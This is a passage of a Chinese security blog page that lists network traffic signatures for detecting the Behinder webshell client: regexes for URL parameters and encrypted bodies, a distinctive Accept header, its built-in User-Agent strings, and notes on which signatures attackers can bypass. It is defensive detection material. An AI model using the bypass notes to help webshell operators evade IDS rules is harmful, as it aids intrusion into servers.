+<h2 id="冰蝎（Behinder）"><a href="#冰蝎（Behinder）" class="headerlink" title="冰蝎（Behinder）"></a>冰蝎（Behinder）</h2><h3 id="弱特征1：密钥传递时URL参数"><a href="#弱特征1：密钥传递时URL参数" class="headerlink" title="弱特征1：密钥传递时URL参数"></a>弱特征1：密钥传递时URL参数</h3><p>密钥传递时，URI只有一个参数，key-value型参数，只有一个参数。Key是黑客给shell设置的密码，一般为10位以下字母和数字，很少有人设置特殊字符做一句话密码的（少数情况我们不考虑）。而Value一般是2至3位随机纯数字。</p>
+<p>另外webshell的扩展名一般为可执行脚本，因此正则为</p>
+<p>.(php|jsp|asp|jspx|asa)?(\w){1,10}&#x3D;\d{2,3}HTTP&#x2F;1.1</p>
+<h3 id="弱特征2：加密时的URL参数"><a href="#弱特征2：加密时的URL参数" class="headerlink" title="弱特征2：加密时的URL参数"></a>弱特征2：加密时的URL参数</h3><p>在加密通讯过程中，没有URL参数。是的，没有参数本身也是一种特征。</p>
+<p>.(php|jsp|asp|jspx|asa) HTTP&#x2F;1.1</p>
+<h3 id="强特征3：Accept字段（可绕过）"><a href="#强特征3：Accept字段（可绕过）" class="headerlink" title="强特征3：Accept字段（可绕过）"></a>强特征3：Accept字段（可绕过）</h3><p>Accept是HTTP协议常用的字段，但冰蝎默认Accept字段的值却很特殊，我也没有想明白为什么要设置这么一个奇怪的值。这个特征存在于冰蝎的任何一个通讯阶段。</p>
+<p>Accept: text&#x2F;html,image&#x2F;gif, image&#x2F;jpeg, ; q&#x3D;.2, *&#x2F;; q&#x3D;.2</p>
+<p>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p>
+<p>冰蝎支持自定义HTTP Header，因此该特征可以被绕过。</p>
+<h3 id="强特征4：UserAgent字段（可绕过）"><a href="#强特征4：UserAgent字段（可绕过）" class="headerlink" title="强特征4：UserAgent字段（可绕过）"></a>强特征4：UserAgent字段（可绕过）</h3><p>冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用。</p>
+<p>以下UserAgent列表是从冰蝎的jar包中提取的，可见大多是比较早的浏览器，现在很少有人使用。而且有些国产浏览器甚至精确到了小版本，众所周知，很多国产浏览器是默认自动更新，正常用户很少用过早的版本，因此可以作为强特征使用。</p>
+<p>列表中有少量标红的UserAgent，目前用户量较大，不可作为强特征。</p>
+<p>如果发现历史流量中同一个源IP访问某个URL时，命中了以下列表中多个UserAgent，那基本确认就是冰蝎了。</p>
+<p>Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.1(KHTML, like Gecko) Chrome&#x2F;14.0.835.163 Safari&#x2F;535.1</p>
+<p>Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:6.0)Gecko&#x2F;20100101 Firefox&#x2F;6.0</p>
+<p>Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;534.50(KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50 “ BOpera&#x2F;9.80 (Windows NT6.1; U; zh-cn) Presto&#x2F;2.9.168 Version&#x2F;11.5</p>
+<p>Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64;x64; Trident&#x2F;5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;Trident&#x2F;4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; .NET4.0C; InfoPath.3)</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.1;Trident&#x2F;4.0; GTB7.0)</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1) , 7</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</p>
+<p>Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; )AppleWebKit&#x2F;534.12 (KHTML, like Gecko) Maxthon&#x2F;3.0 Safari&#x2F;534.12</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</p>
+<p>Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-US)AppleWebKit&#x2F;534.3 (KHTML, like Gecko) Chrome&#x2F;6.0.472.33 Safari&#x2F;534.3 SE 2.XMetaSr</p>
+<p>Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</p>
+<p>Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;535.1 (KHTML,like Gecko) Chrome&#x2F;13.0.782.41 Safari&#x2F;535.1 QQBrowser&#x2F;6.9.11079.20</p>
+<p>Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser&#x2F;6.9.11079</p>
+<p>Mozilla&#x2F;5.0 (compatible; MSIE 9.0; WindowsNT 6.1; WOW64; Trident&#x2F;5.0)</p>
+<p>同样，UserAgent可由攻击者自定义，因此该特征可能会被绕过。</p>
+<h3 id="强特征5：传递的密钥"><a href="#强特征5：传递的密钥" class="headerlink" title="强特征5：传递的密钥"></a>强特征5：传递的密钥</h3><p>加密所用密钥是长度为16的随机字符串，小写字母+数字组成。密钥传递阶段，密钥存在于Response Body中，如图。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1763645767046-3ebb0a56-3c29-4c82-8d61-328a9d98ab52.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>因此密钥特征如下：</p>
+<p>\r\n\r\n[a-z0-9]{16}$</p>
+<p>如果不想使用正则，可使用字符串特征，误报会更多。</p>
+<p>Content-Length: 16</p>
+<h3 id="弱特征6：加密数据上行"><a href="#弱特征6：加密数据上行" class="headerlink" title="弱特征6：加密数据上行"></a>弱特征6：加密数据上行</h3><p>在加密通讯时，php&#x2F;jsp shell会提交base64编码后的数据。用如下正则便可以很好的匹配。</p>
+<p>\r\n\r\n[a-zA-Z\d+&#x2F;]{<strong>20</strong>,}</p>
+<p>注意这条正则最后的数字20，意思是指定的字符出现至少20个才会匹配。而要匹配这段数据长度至少有几K，在TCP层，如此长的数据不会一次性发送，而是拆分成若干“帧”，逐个发送。工作于4层的IDS只能检测“帧”，而“帧”的长度是不确定的（帧的长度是根据网络情况动态调整的），因此这里保守地只写了20。如果你的IDS工作于七层，可以拼接HTTP完整请求的话，这个值可适当增加，以减少误报。</p>
+<h3 id="弱特征7：加密数据下行"><a href="#弱特征7：加密数据下行" class="headerlink" title="弱特征7：加密数据下行"></a>弱特征7：加密数据下行</h3><p>该特征同样存在于加密通讯时，在ResponseBody中的数据是加密后的二进制数据。</p>
+<p>如何用正则去匹配二进制数据呢？这里我使用的方法未必是最好的，仅供大家参考。二进制数据中必然有大量不可见的字符，当然也有不少可见字符，它们出现的位置是随机的。如果第一个位置是可见字符，那么之后的6个字符之内有很大概率出现不可见字符。匹配不可见字符使用零宽负行断言的方式，即不认识的字符即为不可见字符。为了增加准确性，本条策略里扩展了“不可见字符”的定义，这里认为的不可见字符，除了“无法显示的字符”之外，还加入了HTML&#x2F;JSONP中不常见的字符</p>
+<p>\r\n\r\n[\w]{0,6}\w\s&gt;&lt;&#x3D;-‘“&#x2F;.:;,!(){}+</p>
+<p>如果用户加载图片&#x2F;视频等多媒体二进制文件的话也是会引发误报，因此我们再写一条策略，规定MIME类型为html。</p>
+<p>Content-Type: text&#x2F;html</p>
+<p>这两条规则是“且”的关系。意思是如果发现text&#x2F;html类型的文档是二进制的，那么它就是可疑的。</p>
+<p>需要注意的是，并不是所有正则引擎都支持“断言”模型。在使用本策略之前，请确认你使用的正则引擎支持断言，并进行严格测试。</p>
+<h3 id="弱特征8：长连接（可绕过）"><a href="#弱特征8：长连接（可绕过）" class="headerlink" title="弱特征8：长连接（可绕过）"></a>弱特征8：长连接（可绕过）</h3><p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。因此默认情况下，请求头和响应头里都会带有:</p>
+<p>Connection: Keep-Alive</p>
+<p>这个特征存在于冰蝎的任何一个通讯阶段。</p>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-list-text">恶意流量分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-list-text">1. 网站流量特征分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%881%EF%BC%89dirsearch"><span class="toc-list-text">（1）dirsearch</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-sqlmap"><span class="toc-list-text">(2) sqlmap</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-list-text">2.漏洞扫描器流量特征分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%881%EF%BC%89AWVS"><span class="toc-list-text">（1）AWVS</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%882%EF%BC%89namp"><span class="toc-list-text">（2）namp</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-list-text">3.webshell管理工具流量特征分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%881%EF%BC%89%E8%9A%81%E5%89%91"><span class="toc-list-text">（1）蚁剑</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%882%EF%BC%89%E5%86%B0%E8%9D%8E"><span class="toc-list-text">（2）冰蝎</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%883%EF%BC%89%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-list-text">（3）哥斯拉</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%884%EF%BC%89%E8%8F%9C%E5%88%80"><span class="toc-list-text">（4）菜刀</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-%E5%B8%B8%E8%A7%81C2%E8%BF%9C%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-list-text">4.常见C2远控服务器流量特征分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-metasploit"><span class="toc-list-text">(1) metasploit</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%EF%BC%882%EF%BC%89cobaltstrike"><span class="toc-list-text">（2）cobaltstrike</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-list-text">总结</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#WebShell%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-list-text">WebShell客户端流量特征</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-list-text">中国菜刀</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%802011%E7%89%88%E6%9C%AC%E5%8F%8A2014%E7%89%88%E6%9C%AC%E5%90%84%E8%AF%AD%E8%A8%80WebShell%E9%93%BE%E6%8E%A5%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-list-text">中国菜刀2011版本及2014版本各语言WebShell链接流量特征</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%802016%E7%89%88%E6%9C%AC%E5%90%84%E8%AF%AD%E8%A8%80WebShell%E9%93%BE%E6%8E%A5%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-list-text">中国菜刀2016版本各语言WebShell链接流量特征</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91-AntSword"><span class="toc-list-text">中国蚁剑(AntSword)</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%9A%81%E5%89%91PHP%E7%B1%BBWebShell%E9%93%BE%E6%8E%A5%E6%B5%81%E9%87%8F"><span class="toc-list-text">蚁剑PHP类WebShell链接流量</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%9A%81%E5%89%91ASP%E7%B1%BBWebShell%E9%93%BE%E6%8E%A5%E6%B5%81%E9%87%8F"><span class="toc-list-text">蚁剑ASP类WebShell链接流量</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%9A%81%E5%89%91%E7%BB%95%E8%BF%87%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F"><span class="toc-list-text">蚁剑绕过特征流量</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%86%B0%E8%9D%8E%EF%BC%88Behinder%EF%BC%89"><span class="toc-list-text">冰蝎（Behinder）</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%811%EF%BC%9A%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E6%97%B6URL%E5%8F%82%E6%95%B0"><span class="toc-list-text">弱特征1：密钥传递时URL参数</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%812%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%97%B6%E7%9A%84URL%E5%8F%82%E6%95%B0"><span class="toc-list-text">弱特征2：加密时的URL参数</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%BA%E7%89%B9%E5%BE%813%EF%BC%9AAccept%E5%AD%97%E6%AE%B5%EF%BC%88%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-list-text">强特征3：Accept字段（可绕过）</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%BA%E7%89%B9%E5%BE%814%EF%BC%9AUserAgent%E5%AD%97%E6%AE%B5%EF%BC%88%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-list-text">强特征4：UserAgent字段（可绕过）</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%BA%E7%89%B9%E5%BE%815%EF%BC%9A%E4%BC%A0%E9%80%92%E7%9A%84%E5%AF%86%E9%92%A5"><span class="toc-list-text">强特征5：传递的密钥</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%816%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E4%B8%8A%E8%A1%8C"><span class="toc-list-text">弱特征6：加密数据上行</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%817%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%A1%8C"><span class="toc-list-text">弱特征7：加密数据下行</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%818%EF%BC%9A%E9%95%BF%E8%BF%9E%E6%8E%A5%EF%BC%88%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-list-text">弱特征8：长连接（可绕过）</span></a></li></ol></li></ol></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from 电子取证</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E7%BE%8E%E4%BA%9A%E6%9D%AF/%E4%B8%AA%E4%BA%BA%E8%B5%9B/">
+              <strong>个人赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%9124%E6%95%B0%E8%AF%81%E5%86%B3-%E5%9B%A2/">
+              <strong>【转载】24数证决-团</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%88%9D%E8%B5%9B/">
+              <strong>2024数证杯初赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B-%E4%B8%AA%E4%BA%BA%E8%B5%9B/">
+              <strong>2024数证杯决赛-个人赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
